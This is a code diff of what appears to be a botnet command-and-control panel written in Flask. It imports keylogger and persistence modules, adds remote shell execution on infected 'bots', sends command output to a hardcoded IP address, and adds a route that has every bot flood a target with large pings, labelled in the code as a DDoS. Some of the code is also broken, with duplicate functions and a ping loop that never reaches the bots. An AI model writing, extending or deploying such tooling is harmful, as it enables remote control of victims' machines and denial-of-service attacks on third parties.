@@ -1,7 +1,6 @@
 from flask import Flask, request, render_template, redirect, url_for, session, jsonify
 from flask_socketio import SocketIO
-import subprocess, keylogger, persistence, screenshot
-from requests import post, get
+import keylogger, persistence, screenshot, subprocess, os, requests
 
 app = Flask(__name__)
 socketio = SocketIO(app)
@@ -34,6 +33,20 @@ class Client:
         self.OS = info['OS']
         self.sid = info['sid']
         self.status = "Alive"
+
+    def execute_command(self, command):
+        try:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, error = process.communicate()
+            output_str = output.decode('utf-8') if output else ""
+            error_str = error.decode('utf-8') if error else ""
+            if error_str:
+                result = f"Error: {error_str}"
+            else:
+                result = f"Output: {output_str}"
+            return result
+        except Exception as e:
+            return f"Error: {str(e)}"
 
 @app.route('/')
 def redirectLogin():
@@ -123,71 +136,68 @@ def modules():
     return redirect(url_for('login'))
 
 @app.route('/commands.html', methods=['GET', 'POST'])
+@app.route('/commands', methods=['GET', 'POST'])
 def commands():
     if request.method == 'POST':
-        user_command = request.form['command']
-        output = run_command(user_command)
+        user_command = request.json.get('command')
+        bot_id = request.json.get('botId')
+        output = execute_command_on_bot(bot_id, user_command)
+        return jsonify(output=output)
+    elif request.method == 'GET':
+        output = request.args.get('output')
         return render_template('commands.html', output=output)
-    return render_template('commands.html')
 
-@app.route('/execute_command', methods=['POST'])
-def execute_command():
-    data = request.json
-    bot_id = data.get('botId')
-    command = data.get('command')
-
-    if not bot_id:
-        return jsonify({'result': 'Single command executed on multiple bots'})
-
-    result = run_command(command)
-    return jsonify({'result': result})
-
-def run_command(command):
+def execute_command_on_bot(bot_id, command):
+    client = next((c for c in database if c.idNum == int(bot_id)), None)
+    if not client:
+        return f"Error: Bot with ID {bot_id} not found"
     try:
-        if command.startswith("shell"):
-            args = command.split()[1:]
-            f = "cmd.exe"
-            arg = "/c "
-            for a in args:
-                arg += a + " "
-        elif command.startswith("powershell"):
-            args = command.split()[1:]
-            f = "powershell.exe"
-            arg = "-Command "
-            for a in args:
-                arg += a + " "
-        else:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output, error = process.communicate()
-            output_str = output.decode('utf-8') if output else ""
-            error_str = error.decode('utf-8') if error else ""
-
-            if error_str:
-                result = f"Error: {error_str}"
-            else:
-                result = f"Output: {output_str}"
-
-            return result
-
-        process = subprocess.Popen([f, arg], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = process.communicate()
-        output_str = output.decode('utf-8') if output else ""
-        error_str = error.decode('utf-8') if error else ""
-
-        if error_str:
-            result = f"Error: {error_str}"
-        else:
-            result = f"Output: {output_str}"
-
+        result = client.execute_command(command)
         return result
-
     except Exception as e:
         return f"Error: {str(e)}"
 
-@app.route('/logout.html')
+def receive_output():
+    output = request.json.get('output')
+    print("Received output:", output.stdout)
+    return "Output received successfully", 200
+
+def receive_output(output):
+    data = {"output": output}
+    try:
+        response = requests.post("http://192.168.100.222/executecommands", json=data)
+        if response.status_code == 200:
+            print("Output sent successfully.")
+        else:
+            print("Failed to send output. Status code:", response.status_code)
+    except Exception as e:
+        print("Error:", e)
+
+@app.route('/ping.html', methods=['GET', 'POST'])
+def ping():
+    if request.method == 'POST':
+        ip_address = request.form.get('target_ip')
+        output = run_ping(ip_address)
+        return render_template('ping.html', output=output)
+    return render_template('ping.html')
+
+def run_ping(ip_address):
+    try:
+        command = f'ping {ip_address} -t -l 65500'
+        output = {}
+        for client in database:
+            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output[client.idNum] = {
+                'hostname': client.hostname,
+                'status': 'Ping command sent successfully'
+            }
+        return output
+    except Exception as e:
+        return f"Error sending DDoS Ping command to all bots: {str(e)}"
+
+@app.route('/logout')
 def logout():
-    session.pop('loggedin', None)
-    session.pop('username', None)
+    session.clear()
     return redirect(url_for('login'))
 
 @socketio.on('connect')
@@ -229,4 +239,7 @@ def handleMessage(message):
                 c.status = "Dead"
 
 if __name__ == '__main__':
+    app.config['UPLOAD_FOLDER'] = 'output_files'
+    if not os.path.exists(app.config['UPLOAD_FOLDER']):
+        os.makedirs(app.config['UPLOAD_FOLDER'])
     socketio.run(app, host='0.0.0.0')
